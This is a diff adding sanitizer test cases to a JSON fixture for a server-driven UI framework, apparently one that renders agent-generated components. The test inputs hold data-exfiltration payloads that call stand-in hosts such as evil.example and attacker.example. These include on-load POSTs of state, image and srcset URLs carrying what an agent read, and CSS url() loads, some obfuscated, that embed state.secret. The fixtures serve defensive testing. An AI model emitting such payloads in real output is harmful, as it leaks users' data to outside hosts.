@@ -54,6 +54,26 @@
       "name": "nothing runs without a click and nothing posts elsewhere: triggers are emptied and an action carries no restAction",
       "input": {"component": {"type": "ServerSide", "actions": [{"id": "go", "restAction": {"source": {"url": "https://attacker.example/c", "method": "POST", "body": "${state}"}}, "commands": [{"type": "NavigateTo", "data": "/orders"}]}], "triggers": [{"type": "OnLoad", "actionId": "go", "times": 1}], "children": []}},
       "expected": {"component": {"type": "ServerSide", "actions": [{"id": "go", "commands": [{"type": "NavigateTo", "data": "/orders"}]}], "triggers": [], "children": []}}
+    },
+    {
+      "name": "an inline REST source does not load by itself: without a ref it goes, with one it keeps the ref and fetches only by GET",
+      "input": {"component": {"type": "ClientSide", "metadata": {"type": "Crudl", "id": "l", "rowsSource": {"url": "/api/orders/7", "method": "DELETE", "headers": {"X-A": "1"}, "body": "{}", "itemsPath": "items"}}, "children": [{"type": "ClientSide", "metadata": {"type": "FormField", "fieldId": "c", "dataType": "string", "optionsSource": {"ref": "countries", "url": "https://evil.example/opts?d=secret", "method": "POST", "proxy": true, "labelPath": "name"}}}, {"type": "ClientSide", "metadata": {"type": "Kanban", "id": "k", "rowsSource": {"ref": "cards"}}}]}},
+      "expected": {"component": {"type": "ClientSide", "metadata": {"type": "Crudl", "id": "l"}, "children": [{"type": "ClientSide", "metadata": {"type": "FormField", "fieldId": "c", "dataType": "string", "optionsSource": {"ref": "countries", "method": "GET", "labelPath": "name"}}}, {"type": "ClientSide", "metadata": {"type": "Kanban", "id": "k", "rowsSource": {"ref": "cards", "method": "GET"}}}]}}
+    },
+    {
+      "name": "an untrusted answer brings no REST source catalogue of its own: a ref resolves only against the app's",
+      "input": {"restSources": [{"name": "countries", "source": {"url": "https://evil.example/c", "method": "DELETE"}}], "fragments": []},
+      "expected": {"fragments": []}
+    },
+    {
+      "name": "an image loads only from this server or a data: url",
+      "input": {"fragments": [{"component": {"type": "ClientSide", "metadata": {"type": "Image", "src": "https://evil.example/?d=what-the-agent-read"}, "children": [{"type": "ClientSide", "metadata": {"type": "Avatar", "image": "//evil.example/a.png", "name": "Ana"}}, {"type": "ClientSide", "metadata": {"type": "Image", "src": "/images/logo.png"}}, {"type": "ClientSide", "metadata": {"type": "Image", "src": "data:image/png;base64,iVBORw0KGgo="}}, {"type": "ClientSide", "metadata": {"type": "HeroSection", "title": "T", "image": "\\\\evil.example\\x.png"}}, {"type": "ClientSide", "metadata": {"type": "Map", "tileUrl": "https://evil.example/{z}/{x}/{y}.png"}}, {"type": "Element", "name": "video", "attributes": {"poster": "https://evil.example/p", "src": "clip.mp4", "srcset": "a.png 1x, https://evil.example/b.png 2x"}, "on": {}, "content": null, "html": false}]}}]},
+      "expected": {"fragments": [{"component": {"type": "ClientSide", "metadata": {"type": "Image", "src": ""}, "children": [{"type": "ClientSide", "metadata": {"type": "Avatar", "image": "", "name": "Ana"}}, {"type": "ClientSide", "metadata": {"type": "Image", "src": "/images/logo.png"}}, {"type": "ClientSide", "metadata": {"type": "Image", "src": "data:image/png;base64,iVBORw0KGgo="}}, {"type": "ClientSide", "metadata": {"type": "HeroSection", "title": "T", "image": ""}}, {"type": "ClientSide", "metadata": {"type": "Map", "tileUrl": ""}}, {"type": "Element", "name": "video", "attributes": {"poster": "", "src": "clip.mp4", "srcset": ""}, "on": {}, "content": null, "html": false}]}}]}
+    },
+    {
+      "name": "a style that would load something is blanked, and a style rule computed by an expression goes",
+      "input": {"component": {"type": "ClientSide", "style": "background:URL(https://evil.example/?d=1)", "metadata": {"type": "Text", "text": "x", "style": "color: red"}, "rules": [{"filter": "true", "action": "SetStyle", "value": "background-image:image-set('https://evil.example/a' 1x)"}, {"filter": "true", "action": "SetStyle", "value": "color: blue"}, {"filter": "true", "action": "SetStyle", "expression": "'background:url(https://evil.example/?' + state.secret + ')'"}, {"filter": "true", "action": "SetAttributeValue", "fieldName": "f", "fieldAttribute": "style", "expression": "state.s"}, {"filter": "true", "action": "SetAttributeValue", "fieldName": "f", "fieldAttribute": "hidden", "expression": "state.h"}], "children": [{"type": "Element", "name": "div", "attributes": {"STYLE": "background:u\\72l(https://evil.example/)", "title": "t"}, "on": {}, "content": "x", "html": false}]}},
+      "expected": {"component": {"type": "ClientSide", "style": "", "metadata": {"type": "Text", "text": "x", "style": "color: red"}, "rules": [{"filter": "true", "action": "SetStyle", "value": "color: blue"}, {"filter": "true", "action": "SetAttributeValue", "fieldName": "f", "fieldAttribute": "hidden", "expression": "state.h"}], "children": [{"type": "Element", "name": "div", "attributes": {"STYLE": "", "title": "t"}, "on": {}, "content": "x", "html": false}]}}
     }
   ]
 }
